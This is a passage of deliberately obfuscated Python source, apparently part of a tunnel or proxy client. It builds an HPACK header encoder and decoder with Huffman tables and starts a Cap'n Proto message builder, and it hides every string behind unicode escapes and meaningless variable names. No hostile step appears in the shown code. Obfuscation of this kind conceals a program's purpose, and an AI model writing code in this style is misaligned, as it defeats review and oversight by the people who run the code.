    O0_var_501 = os.getenv(codecs.decode('\\u004b\\u0049\\u0053\\u0041\\u004d\\u0041\\u005f\\u0041\\u0052\\u0047\\u004f\\u005f\\u0049\\u0044\\u004c\\u0045\\u005f\\u0054\\u0049\\u004d\\u0045\\u004f\\u0055\\u0054', 'unicode_escape'), codecs.decode('', 'unicode_escape')).strip()
    if O0_var_501 == codecs.decode('\\u0030', 'unicode_escape'):
        return 0
    try:
        O0_var_502 = int(O0_var_501)
    except ValueError:
        return 300
    return O0_var_502 if O0_var_502 >= 10 else 300
ARGO_IDLE_TIMEOUT = _argo_idle_timeout()
STATIC_TABLE = ((codecs.decode('\\u003a\\u0061\\u0075\\u0074\\u0068\\u006f\\u0072\\u0069\\u0074\\u0079', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u003a\\u006d\\u0065\\u0074\\u0068\\u006f\\u0064', 'unicode_escape'), codecs.decode('\\u0047\\u0045\\u0054', 'unicode_escape')), (codecs.decode('\\u003a\\u006d\\u0065\\u0074\\u0068\\u006f\\u0064', 'unicode_escape'), codecs.decode('\\u0050\\u004f\\u0053\\u0054', 'unicode_escape')), (codecs.decode('\\u003a\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'), codecs.decode('\\u002f', 'unicode_escape')), (codecs.decode('\\u003a\\u0070\\u0061\\u0074\\u0068', 'unicode_escape'), codecs.decode('\\u002f\\u0069\\u006e\\u0064\\u0065\\u0078\\u002e\\u0068\\u0074\\u006d\\u006c', 'unicode_escape')), (codecs.decode('\\u003a\\u0073\\u0063\\u0068\\u0065\\u006d\\u0065', 'unicode_escape'), codecs.decode('\\u0068\\u0074\\u0074\\u0070', 'unicode_escape')), (codecs.decode('\\u003a\\u0073\\u0063\\u0068\\u0065\\u006d\\u0065', 'unicode_escape'), codecs.decode('\\u0068\\u0074\\u0074\\u0070\\u0073', 'unicode_escape')), (codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0032\\u0030\\u0030', 'unicode_escape')), (codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0032\\u0030\\u0034', 'unicode_escape')), (codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0032\\u0030\\u0036', 'unicode_escape')), (codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0033\\u0030\\u0034', 'unicode_escape')), (codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0034\\u0030\\u0030', 'unicode_escape')), (codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0034\\u0030\\u0034', 'unicode_escape')), (codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape'), codecs.decode('\\u0035\\u0030\\u0030', 'unicode_escape')), (codecs.decode('\\u0061\\u0063\\u0063\\u0065\\u0070\\u0074\\u002d\\u0063\\u0068\\u0061\\u0072\\u0073\\u0065\\u0074', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0061\\u0063\\u0063\\u0065\\u0070\\u0074\\u002d\\u0065\\u006e\\u0063\\u006f\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'), codecs.decode('\\u0067\\u007a\\u0069\\u0070\\u002c\\u0020\\u0064\\u0065\\u0066\\u006c\\u0061\\u0074\\u0065', 'unicode_escape')), (codecs.decode('\\u0061\\u0063\\u0063\\u0065\\u0070\\u0074\\u002d\\u006c\\u0061\\u006e\\u0067\\u0075\\u0061\\u0067\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0061\\u0063\\u0063\\u0065\\u0070\\u0074\\u002d\\u0072\\u0061\\u006e\\u0067\\u0065\\u0073', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0061\\u0063\\u0063\\u0065\\u0070\\u0074', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0061\\u0063\\u0063\\u0065\\u0073\\u0073\\u002d\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c\\u002d\\u0061\\u006c\\u006c\\u006f\\u0077\\u002d\\u006f\\u0072\\u0069\\u0067\\u0069\\u006e', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0061\\u0067\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0061\\u006c\\u006c\\u006f\\u0077', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0061\\u0075\\u0074\\u0068\\u006f\\u0072\\u0069\\u007a\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0063\\u0061\\u0063\\u0068\\u0065\\u002d\\u0063\\u006f\\u006e\\u0074\\u0072\\u006f\\u006c', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0064\\u0069\\u0073\\u0070\\u006f\\u0073\\u0069\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0065\\u006e\\u0063\\u006f\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u006c\\u0061\\u006e\\u0067\\u0075\\u0061\\u0067\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u006c\\u0065\\u006e\\u0067\\u0074\\u0068', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u006c\\u006f\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0072\\u0061\\u006e\\u0067\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0063\\u006f\\u006e\\u0074\\u0065\\u006e\\u0074\\u002d\\u0074\\u0079\\u0070\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0063\\u006f\\u006f\\u006b\\u0069\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0064\\u0061\\u0074\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0065\\u0074\\u0061\\u0067', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0065\\u0078\\u0070\\u0065\\u0063\\u0074', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0065\\u0078\\u0070\\u0069\\u0072\\u0065\\u0073', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0066\\u0072\\u006f\\u006d', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0068\\u006f\\u0073\\u0074', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0069\\u0066\\u002d\\u006d\\u0061\\u0074\\u0063\\u0068', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0069\\u0066\\u002d\\u006d\\u006f\\u0064\\u0069\\u0066\\u0069\\u0065\\u0064\\u002d\\u0073\\u0069\\u006e\\u0063\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0069\\u0066\\u002d\\u006e\\u006f\\u006e\\u0065\\u002d\\u006d\\u0061\\u0074\\u0063\\u0068', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0069\\u0066\\u002d\\u0072\\u0061\\u006e\\u0067\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0069\\u0066\\u002d\\u0075\\u006e\\u006d\\u006f\\u0064\\u0069\\u0066\\u0069\\u0065\\u0064\\u002d\\u0073\\u0069\\u006e\\u0063\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u006c\\u0061\\u0073\\u0074\\u002d\\u006d\\u006f\\u0064\\u0069\\u0066\\u0069\\u0065\\u0064', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u006c\\u0069\\u006e\\u006b', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u006c\\u006f\\u0063\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u006d\\u0061\\u0078\\u002d\\u0066\\u006f\\u0072\\u0077\\u0061\\u0072\\u0064\\u0073', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0070\\u0072\\u006f\\u0078\\u0079\\u002d\\u0061\\u0075\\u0074\\u0068\\u0065\\u006e\\u0074\\u0069\\u0063\\u0061\\u0074\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0070\\u0072\\u006f\\u0078\\u0079\\u002d\\u0061\\u0075\\u0074\\u0068\\u006f\\u0072\\u0069\\u007a\\u0061\\u0074\\u0069\\u006f\\u006e', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0072\\u0061\\u006e\\u0067\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0072\\u0065\\u0066\\u0065\\u0072\\u0065\\u0072', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0072\\u0065\\u0066\\u0072\\u0065\\u0073\\u0068', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0072\\u0065\\u0074\\u0072\\u0079\\u002d\\u0061\\u0066\\u0074\\u0065\\u0072', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0073\\u0065\\u0072\\u0076\\u0065\\u0072', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0073\\u0065\\u0074\\u002d\\u0063\\u006f\\u006f\\u006b\\u0069\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0073\\u0074\\u0072\\u0069\\u0063\\u0074\\u002d\\u0074\\u0072\\u0061\\u006e\\u0073\\u0070\\u006f\\u0072\\u0074\\u002d\\u0073\\u0065\\u0063\\u0075\\u0072\\u0069\\u0074\\u0079', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0074\\u0072\\u0061\\u006e\\u0073\\u0066\\u0065\\u0072\\u002d\\u0065\\u006e\\u0063\\u006f\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0075\\u0073\\u0065\\u0072\\u002d\\u0061\\u0067\\u0065\\u006e\\u0074', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0076\\u0061\\u0072\\u0079', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0076\\u0069\\u0061', 'unicode_escape'), codecs.decode('', 'unicode_escape')), (codecs.decode('\\u0077\\u0077\\u0077\\u002d\\u0061\\u0075\\u0074\\u0068\\u0065\\u006e\\u0074\\u0069\\u0063\\u0061\\u0074\\u0065', 'unicode_escape'), codecs.decode('', 'unicode_escape')))
HUFFMAN_CODES = (8184, 8388568, 268435426, 268435427, 268435428, 268435429, 268435430, 268435431, 268435432, 16777194, 1073741820, 268435433, 268435434, 1073741821, 268435435, 268435436, 268435437, 268435438, 268435439, 268435440, 268435441, 268435442, 1073741822, 268435443, 268435444, 268435445, 268435446, 268435447, 268435448, 268435449, 268435450, 268435451, 20, 1016, 1017, 4090, 8185, 21, 248, 2042, 1018, 1019, 249, 2043, 250, 22, 23, 24, 0, 1, 2, 25, 26, 27, 28, 29, 30, 31, 92, 251, 32764, 32, 4091, 1020, 8186, 33, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 252, 115, 253, 8187, 524272, 8188, 16380, 34, 32765, 3, 35, 4, 36, 5, 37, 38, 39, 6, 116, 117, 40, 41, 42, 7, 43, 118, 44, 8, 9, 45, 119, 120, 121, 122, 123, 32766, 2044, 16381, 8189, 268435452, 1048550, 4194258, 1048551, 1048552, 4194259, 4194260, 4194261, 8388569, 4194262, 8388570, 8388571, 8388572, 8388573, 8388574, 16777195, 8388575, 16777196, 16777197, 4194263, 8388576, 16777198, 8388577, 8388578, 8388579, 8388580, 2097116, 4194264, 8388581, 4194265, 8388582, 8388583, 16777199, 4194266, 2097117, 1048553, 4194267, 4194268, 8388584, 8388585, 2097118, 8388586, 4194269, 4194270, 16777200, 2097119, 4194271, 8388587, 8388588, 2097120, 2097121, 4194272, 2097122, 8388589, 4194273, 8388590, 8388591, 1048554, 4194274, 4194275, 4194276, 8388592, 4194277, 4194278, 8388593, 67108832, 67108833, 1048555, 524273, 4194279, 8388594, 4194280, 33554412, 67108834, 67108835, 67108836, 134217694, 134217695, 67108837, 16777201, 33554413, 524274, 2097123, 67108838, 134217696, 134217697, 67108839, 134217698, 16777202, 2097124, 2097125, 67108840, 67108841, 268435453, 134217699, 134217700, 134217701, 1048556, 16777203, 1048557, 2097126, 4194281, 2097127, 2097128, 8388595, 4194282, 4194283, 33554414, 33554415, 16777204, 16777205, 67108842, 8388596, 67108843, 134217702, 67108844, 67108845, 134217703, 134217704, 134217705, 134217706, 134217707, 268435454, 134217708, 134217709, 134217710, 134217711, 134217712, 67108846, 1073741823)
HUFFMAN_LENGTHS = (13, 23, 28, 28, 28, 28, 28, 28, 28, 24, 30, 28, 28, 30, 28, 28, 28, 28, 28, 28, 28, 28, 30, 28, 28, 28, 28, 28, 28, 28, 28, 28, 6, 10, 10, 12, 13, 6, 8, 11, 10, 10, 8, 11, 8, 6, 6, 6, 5, 5, 5, 6, 6, 6, 6, 6, 6, 6, 7, 8, 15, 6, 12, 10, 13, 6, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 8, 7, 8, 13, 19, 13, 14, 6, 15, 5, 6, 5, 6, 5, 6, 6, 6, 5, 7, 7, 6, 6, 6, 5, 6, 7, 6, 5, 5, 6, 7, 7, 7, 7, 7, 15, 11, 14, 13, 28, 20, 22, 20, 20, 22, 22, 22, 23, 22, 23, 23, 23, 23, 23, 24, 23, 24, 24, 22, 23, 24, 23, 23, 23, 23, 21, 22, 23, 22, 23, 23, 24, 22, 21, 20, 22, 22, 23, 23, 21, 23, 22, 22, 24, 21, 22, 23, 23, 21, 21, 22, 21, 23, 22, 23, 23, 20, 22, 22, 22, 23, 22, 22, 23, 26, 26, 20, 19, 22, 23, 22, 25, 26, 26, 26, 27, 27, 26, 24, 25, 19, 21, 26, 27, 27, 26, 27, 24, 21, 21, 26, 26, 28, 27, 27, 27, 20, 24, 20, 21, 22, 21, 21, 23, 22, 22, 25, 25, 24, 24, 26, 23, 26, 27, 26, 26, 27, 27, 27, 27, 27, 28, 27, 27, 27, 27, 27, 26, 30)

def O0_fn_3():
    O0_var_503 = [None, None, -1, 0]
    for O0_var_504, (O0_var_505, O0_var_506) in enumerate(zip(HUFFMAN_CODES, HUFFMAN_LENGTHS)):
        O0_var_507 = O0_var_503
        for O0_var_508 in range(O0_var_506 - 1, -1, -1):
            O0_var_509 = O0_var_505 >> O0_var_508 & 1
            if O0_var_507[O0_var_509] is None:
                O0_var_507[O0_var_509] = [None, None, -1, O0_var_507[3] + 1]
            O0_var_507 = O0_var_507[O0_var_509]
        O0_var_507[2] = O0_var_504
    return O0_var_503
HUFFMAN_TREE = O0_fn_3()

def O0_fn_4(data):
    O0_var_510 = bytearray()
    O0_var_511 = HUFFMAN_TREE
    O0_var_512 = 0
    O0_var_513 = 0
    for O0_var_514 in data:
        for O0_var_515 in range(7, -1, -1):
            O0_var_516 = O0_var_514 >> O0_var_515 & 1
            O0_var_512 = O0_var_512 << 1 | O0_var_516
            O0_var_513 += 1
            O0_var_511 = O0_var_511[O0_var_516]
            if O0_var_511 is None:
                raise ValueError(codecs.decode('\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0048\\u0050\\u0041\\u0043\\u004b\\u0020\\u0048\\u0075\\u0066\\u0066\\u006d\\u0061\\u006e\\u0020\\u0073\\u0074\\u0072\\u0069\\u006e\\u0067', 'unicode_escape'))
            if O0_var_511[2] >= 0:
                if O0_var_511[2] == 256:
                    raise ValueError(codecs.decode('\\u0048\\u0050\\u0041\\u0043\\u004b\\u0020\\u0048\\u0075\\u0066\\u0066\\u006d\\u0061\\u006e\\u0020\\u0045\\u004f\\u0053\\u0020\\u0069\\u006e\\u0073\\u0069\\u0064\\u0065\\u0020\\u0073\\u0074\\u0072\\u0069\\u006e\\u0067', 'unicode_escape'))
                O0_var_510.append(O0_var_511[2])
                O0_var_511 = HUFFMAN_TREE
                O0_var_512 = 0
                O0_var_513 = 0
    if O0_var_513 > 7 or O0_var_512 != (1 << O0_var_513) - 1:
        raise ValueError(codecs.decode('\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0048\\u0050\\u0041\\u0043\\u004b\\u0020\\u0048\\u0075\\u0066\\u0066\\u006d\\u0061\\u006e\\u0020\\u0070\\u0061\\u0064\\u0064\\u0069\\u006e\\u0067', 'unicode_escape'))
    return bytes(O0_var_510)

def O0_fn_5(data, O0_var_517, O0_var_518):
    if O0_var_517 >= len(data):
        raise ValueError(codecs.decode('\\u0074\\u0072\\u0075\\u006e\\u0063\\u0061\\u0074\\u0065\\u0064\\u0020\\u0048\\u0050\\u0041\\u0043\\u004b\\u0020\\u0069\\u006e\\u0074\\u0065\\u0067\\u0065\\u0072', 'unicode_escape'))
    O0_var_519 = data[O0_var_517]
    O0_var_517 += 1
    O0_var_520 = (1 << O0_var_518) - 1
    O0_var_521 = O0_var_519 & O0_var_520
    if O0_var_521 < O0_var_520:
        return (O0_var_521, O0_var_517)
    O0_var_522 = 0
    while True:
        if O0_var_517 >= len(data):
            raise ValueError(codecs.decode('\\u0074\\u0072\\u0075\\u006e\\u0063\\u0061\\u0074\\u0065\\u0064\\u0020\\u0048\\u0050\\u0041\\u0043\\u004b\\u0020\\u0069\\u006e\\u0074\\u0065\\u0067\\u0065\\u0072', 'unicode_escape'))
        O0_var_523 = data[O0_var_517]
        O0_var_517 += 1
        O0_var_521 += (O0_var_523 & 127) << O0_var_522
        if O0_var_523 & 128 == 0:
            return (O0_var_521, O0_var_517)
        O0_var_522 += 7
        if O0_var_522 > 28:
            raise ValueError(codecs.decode('\\u0048\\u0050\\u0041\\u0043\\u004b\\u0020\\u0069\\u006e\\u0074\\u0065\\u0067\\u0065\\u0072\\u0020\\u0074\\u006f\\u006f\\u0020\\u006c\\u0061\\u0072\\u0067\\u0065', 'unicode_escape'))

def O0_fn_6(data, O0_var_524):
    if O0_var_524 >= len(data):
        raise ValueError(codecs.decode('\\u0074\\u0072\\u0075\\u006e\\u0063\\u0061\\u0074\\u0065\\u0064\\u0020\\u0048\\u0050\\u0041\\u0043\\u004b\\u0020\\u0073\\u0074\\u0072\\u0069\\u006e\\u0067', 'unicode_escape'))
    O0_var_525 = bool(data[O0_var_524] & 128)
    O0_var_526, O0_var_524 = O0_fn_5(data, O0_var_524, 7)
    O0_var_527 = O0_var_524 + O0_var_526
    if O0_var_527 > len(data):
        raise ValueError(codecs.decode('\\u0074\\u0072\\u0075\\u006e\\u0063\\u0061\\u0074\\u0065\\u0064\\u0020\\u0048\\u0050\\u0041\\u0043\\u004b\\u0020\\u0073\\u0074\\u0072\\u0069\\u006e\\u0067\\u0020\\u0064\\u0061\\u0074\\u0061', 'unicode_escape'))
    O0_var_528 = data[O0_var_524:O0_var_527]
    return (O0_fn_4(O0_var_528) if O0_var_525 else O0_var_528, O0_var_527)

class HpackDecoder:

    def __init__(self):
        self.dynamic = deque()
        self.dynamic_size = 0
        self.max_size = 4096

    def table_entry(self, O0_var_529):
        if O0_var_529 <= 0:
            raise ValueError(codecs.decode('\\u0069\\u006e\\u0076\\u0061\\u006c\\u0069\\u0064\\u0020\\u0048\\u0050\\u0041\\u0043\\u004b\\u0020\\u0069\\u006e\\u0064\\u0065\\u0078', 'unicode_escape'))
        if O0_var_529 <= len(STATIC_TABLE):
            return STATIC_TABLE[O0_var_529 - 1]
        O0_var_530 = O0_var_529 - len(STATIC_TABLE) - 1
        if O0_var_530 < 0 or O0_var_530 >= len(self.dynamic):
            raise ValueError(codecs.decode('\\u0048\\u0050\\u0041\\u0043\\u004b\\u0020\\u0064\\u0079\\u006e\\u0061\\u006d\\u0069\\u0063\\u0020\\u0069\\u006e\\u0064\\u0065\\u0078\\u0020\\u006f\\u0075\\u0074\\u0020\\u006f\\u0066\\u0020\\u0072\\u0061\\u006e\\u0067\\u0065', 'unicode_escape'))
        return self.dynamic[O0_var_530]

    def add(self, name, O0_var_531):
        O0_var_532 = 32 + len(name) + len(O0_var_531)
        if O0_var_532 > self.max_size:
            self.dynamic.clear()
            self.dynamic_size = 0
            return
        while self.dynamic and self.dynamic_size + O0_var_532 > self.max_size:
            O0_var_533, O0_var_534 = self.dynamic.pop()
            self.dynamic_size -= 32 + len(O0_var_533) + len(O0_var_534)
        self.dynamic.appendleft((name, O0_var_531))
        self.dynamic_size += O0_var_532

    def decode(self, data):
        O0_var_535 = []
        O0_var_536 = 0
        while O0_var_536 < len(data):
            O0_var_537 = data[O0_var_536]
            if O0_var_537 & 128:
                O0_var_538, O0_var_536 = O0_fn_5(data, O0_var_536, 7)
                O0_var_535.append(self.table_entry(O0_var_538))
                continue
            if O0_var_537 & 64:
                O0_var_538, O0_var_536 = O0_fn_5(data, O0_var_536, 6)
                if O0_var_538:
                    O0_var_539 = self.table_entry(O0_var_538)[0]
                else:
                    O0_var_540, O0_var_536 = O0_fn_6(data, O0_var_536)
                    O0_var_539 = O0_var_540.decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape')).lower()
                O0_var_541, O0_var_536 = O0_fn_6(data, O0_var_536)
                O0_var_542 = O0_var_541.decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape'))
                self.add(O0_var_539, O0_var_542)
                O0_var_535.append((O0_var_539, O0_var_542))
                continue
            if O0_var_537 & 32:
                O0_var_543, O0_var_536 = O0_fn_5(data, O0_var_536, 5)
                if O0_var_543 > 4096:
                    raise ValueError(codecs.decode('\\u0048\\u0050\\u0041\\u0043\\u004b\\u0020\\u0074\\u0061\\u0062\\u006c\\u0065\\u0020\\u0073\\u0069\\u007a\\u0065\\u0020\\u0065\\u0078\\u0063\\u0065\\u0065\\u0064\\u0073\\u0020\\u006c\\u0069\\u006d\\u0069\\u0074', 'unicode_escape'))
                self.max_size = O0_var_543
                while self.dynamic and self.dynamic_size > O0_var_543:
                    O0_var_544, O0_var_545 = self.dynamic.pop()
                    self.dynamic_size -= 32 + len(O0_var_544) + len(O0_var_545)
                continue
            O0_var_538, O0_var_536 = O0_fn_5(data, O0_var_536, 4)
            if O0_var_538:
                O0_var_539 = self.table_entry(O0_var_538)[0]
            else:
                O0_var_540, O0_var_536 = O0_fn_6(data, O0_var_536)
                O0_var_539 = O0_var_540.decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape')).lower()
            O0_var_541, O0_var_536 = O0_fn_6(data, O0_var_536)
            O0_var_535.append((O0_var_539, O0_var_541.decode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape'), codecs.decode('\\u0072\\u0065\\u0070\\u006c\\u0061\\u0063\\u0065', 'unicode_escape'))))
        return O0_var_535

def O0_fn_7(O0_var_546, O0_var_547, O0_var_548):
    O0_var_549 = (1 << O0_var_547) - 1
    if O0_var_546 < O0_var_549:
        return bytes((O0_var_548 | O0_var_546,))
    O0_var_550 = bytearray((O0_var_548 | O0_var_549,))
    O0_var_546 -= O0_var_549
    while O0_var_546 >= 128:
        O0_var_550.append(O0_var_546 & 127 | 128)
        O0_var_546 >>= 7
    O0_var_550.append(O0_var_546)
    return bytes(O0_var_550)

def O0_fn_8(O0_var_551):
    O0_var_552 = O0_var_551.encode(codecs.decode('\\u0075\\u0074\\u0066\\u002d\\u0038', 'unicode_escape')) if isinstance(O0_var_551, str) else O0_var_551
    return O0_fn_7(len(O0_var_552), 7, 0) + O0_var_552

def O0_fn_9(headers):
    O0_var_553 = bytearray()
    for O0_var_554, O0_var_555 in headers:
        if O0_var_554 == codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape') and O0_var_555 == codecs.decode('\\u0032\\u0030\\u0030', 'unicode_escape'):
            O0_var_553.append(136)
        elif O0_var_554 == codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape') and O0_var_555 == codecs.decode('\\u0032\\u0030\\u0034', 'unicode_escape'):
            O0_var_553.append(137)
        elif O0_var_554 == codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape') and O0_var_555 == codecs.decode('\\u0032\\u0030\\u0036', 'unicode_escape'):
            O0_var_553.append(138)
        elif O0_var_554 == codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape') and O0_var_555 == codecs.decode('\\u0033\\u0030\\u0034', 'unicode_escape'):
            O0_var_553.append(139)
        elif O0_var_554 == codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape') and O0_var_555 == codecs.decode('\\u0034\\u0030\\u0030', 'unicode_escape'):
            O0_var_553.append(140)
        elif O0_var_554 == codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape') and O0_var_555 == codecs.decode('\\u0034\\u0030\\u0034', 'unicode_escape'):
            O0_var_553.append(141)
        elif O0_var_554 == codecs.decode('\\u003a\\u0073\\u0074\\u0061\\u0074\\u0075\\u0073', 'unicode_escape') and O0_var_555 == codecs.decode('\\u0035\\u0030\\u0030', 'unicode_escape'):
            O0_var_553.append(142)
        else:
            O0_var_553.extend(O0_fn_7(0, 4, 0))
            O0_var_553.extend(O0_fn_8(O0_var_554))
            O0_var_553.extend(O0_fn_8(O0_var_555))
    return bytes(O0_var_553)

class CapnpBuilder:

    def __init__(self):
        self.words = []

    def alloc(self, O0_var_556):
        O0_var_557 = len(self.words)
        self.words.extend([0] * O0_var_556)
        return O0_var_557

    def struct_ptr(self, O0_var_558, O0_var_559, O0_var_560, O0_var_561):
        O0_var_562 = O0_var_559 - O0_var_558 - 1
        O0_var_563 = O0_var_562 << 2 & 4294967292
        O0_var_564 = O0_var_560 & 65535 | (O0_var_561 & 65535) << 16
        self.words[O0_var_558] = O0_var_563 | O0_var_564 << 32

    def set_u8(self, O0_var_565, O0_var_566, O0_var_567):
        O0_var_568 = 255 << O0_var_566 * 8
        self.words[O0_var_565] = self.words[O0_var_565] & ~O0_var_568 | (O0_var_567 & 255) << O0_var_566 * 8

    def set_u16(self, O0_var_569, O0_var_570, O0_var_571):
        O0_var_572 = 65535 << O0_var_570 * 8
        self.words[O0_var_569] = self.words[O0_var_569] & ~O0_var_572 | (O0_var_571 & 65535) << O0_var_570 * 8

    def set_u32(self, O0_var_573, O0_var_574, O0_var_575):
        O0_var_576 = 4294967295 << O0_var_574 * 8
        self.words[O0_var_573] = self.words[O0_var_573] & ~O0_var_576 | (O0_var_575 & 4294967295) << O0_var_574 * 8

    def set_u64(self, O0_var_577, O0_var_578):
        self.words[O0_var_577] = O0_var_578 & 18446744073709551615

    def write_bytes(self, O0_var_579, O0_var_580, text=False):
        O0_var_581 = O0_var_580.encode() if isinstance(O0_var_580, str) else bytes(O0_var_580)
        O0_var_582 = len(O0_var_581) + 1 if text else len(O0_var_581)
        O0_var_583 = self.alloc((O0_var_582 + 7) // 8)
        for O0_var_584, O0_var_585 in enumerate(O0_var_581):
            self.set_u8(O0_var_583 + O0_var_584 // 8, O0_var_584 % 8, O0_var_585)
        O0_var_586 = O0_var_583 - O0_var_579 - 1
        O0_var_587 = (O0_var_586 << 2 | 1) & 4294967295
        O0_var_588 = 2 | (O0_var_582 & 536870911) << 3
        self.words[O0_var_579] = O0_var_587 | O0_var_588 << 32

    def write_text_list(self, O0_var_589, O0_var_590):
        if not O0_var_590:
            self.words[O0_var_589] = 0
            return
        O0_var_591 = self.alloc(len(O0_var_590))
        O0_var_592 = O0_var_591 - O0_var_589 - 1
        self.words[O0_var_589] = (O0_var_592 << 2 | 1) & 4294967295 | (6 | len(O0_var_590) << 3) << 32
        for O0_var_593, O0_var_594 in enumerate(O0_var_590):
